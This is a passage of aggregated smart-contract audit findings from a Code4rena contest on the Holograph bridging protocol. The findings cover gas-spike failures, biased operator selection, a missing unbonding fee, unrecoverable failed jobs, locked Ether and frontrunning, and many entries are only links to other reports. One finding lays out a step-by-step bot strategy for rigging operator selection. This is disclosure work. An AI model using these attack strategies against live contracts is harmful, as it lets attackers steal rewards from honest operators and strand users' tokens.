[evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).   ## Recommended Mitigation Steps Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255   # Vulnerability details  ## Impact  If the following conditions have been met: * The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)  * Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request  Then the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.   ## Proof of Concept The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14_holograph_operator_tests.ts#L834-L844) provided by the sponsor.  An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.  ## Recommended Mitigation Steps  In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144   # Vulnerability details  # H001 An attacker can manipulate each pod and gain an advantage over the remainder Operators  ## Impact  In [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:  - Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499)) - A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503)) - An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).  This creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):  * An Operator can easily join and leave a pod, albeit when leaving a small fee is paid * An Operator can only join one pod, but an attacker can control multiple Operators * The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job  Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.  ## Proof of Concept  Consider the following simulation for 10 pods with a varying number of operators follows (X → "does not apply"): | Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P0 | 10 | 615 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 615 | | P1 | 3 | 203 | 205 | 207 | X | X | X | X | X | X | X | 615 | | P2 | 6 | 208 | 0 | 233 | 0 | 207 | 0 | X | X | X | X | 648 | | P3 | 9 | 61 | 62 | 69 | 70 | 65 | 69 | 61 | 60 | 54 | X | 571 | | P4 | 4 | 300 | 0 | 292 | 0 | X | X | X | X | X | X | 592 | | P5 | 10 | 0 | 0 | 0 | 0 | 0 | 586 | 0 | 0 | 0 | 0 | 586 | | P6 | 2 | 602 | 0 | X | X | X | X | X | X | X | X | 602 | | P7 | 7 | 93 | 93 | 100 | 99 | 76 | 74 | 78 | X | X | X | 613 | | P8 | 2 | 586 | 0 | X | X | X | X | X | X | X | X | 586 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 |  At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:  | Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P9A | 4 | 0 | 276 | 0 | 295 | X | X | X | X | X | X | 571 | | P9B | 5 | 0 | 0 | 0 | 0 | 571 | X | X | X | X | X | 571 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 | | P9C | 7 | 66 | 77 | 81 | 83 | 87 | 90 | 87 | X | X | X | 571 | | P9D | 8 | 0 | 127 | 0 | 147 | 0 | 149 | 0 | 148 | X | X | 571 |  And then:  1. She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds. 2. After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`. 3. She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline. 4. She now has 1/3 of the probability to be chosen for the next job: 4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod. 4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds). 5. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.   Alternative timeline (from previous 3.): 1. The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`). 2. Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.  There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.  ## Tools Used  Manual  ## Recommended Mitigation Steps  Has stated in `M001-Biased distribution`, use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.  Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.  And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.  
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/saneryee-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ret2basic-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xsam-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932   # Vulnerability details  ## Impact  When user call unbondUtilityToken to unstake the token,   the function read the available bonded amount, and transfer back to the operator  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed"); ```  the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  >To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.  The charge 0.1% fee is not implemented in the code.  there are two incentive for bounded operator to stay,  the first is the reward incentive, the second is to avoid penalty with unbonding.  Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want  ## Proof of Concept  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  we recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; uint256 fee = chargedFee(amount); // here amount -= fee;   /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed"); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RaymondFam-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/zishansami-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakman-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Saintcode_-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/fatherOfBlocks-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/exolorkistis-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/mcwildy-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/adriro-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429   # Vulnerability details  ## Impact Failed job can't be recovered. NFT may be lost.  ## Proof of Concept ```solidity function executeJob(bytes calldata bridgeInRequestPayload) external payable { ... delete _operatorJobs[hash]; ...     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     } } ```  First, it will `delete _operatorJobs[hash];` to have it not replayable.  Next, assume nonRevertingBridgeCall failed. NFT won't be minted and the catch block is entered.  _failedJobs[hash] is set to true and event is emitted  Notice that _operatorJobs[hash] has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.  ## Recommended Mitigation Steps Move `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`  ```solidity ... if (!_failedJobs[hash]) delete _operatorJobs[hash]; ... ```  But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check _failedJobs flag to allow retry for only the selected operator.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0x1f8b-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bobirichman-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Picodes-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Satyam_Sharma-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/abstract/ERC20H.sol#L106-L229   # Vulnerability details  ## Impact Contract ERC20H has payable functions (receive(), fallback(), etc.), but does not have a function to withdraw, therefore, every Ether sent to HolographERC20 will be lost.  ## Proof of Concept Contract functions and structure illustrate the concept.  ## Tools Used Slither  ## Recommended Mitigation Steps Remove the payable attribute or add a withdraw function.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gogo-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Impact Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed.  ## Proof of Concept ```solidity require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected"); ```  ```solidity         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Since you have designed a mechanism to prevent other operators to slash the operator due to "the selected missed the time slot due to a gas spike". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.  But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.  ```solidity require(timeDifference > 0, "HOLOGRAPH: operator has time"); ```  Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.  ## Recommended Mitigation Steps Modify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gianganhnguyen-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/csanuragjain-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mathieu-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/durianSausage-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-G.md).
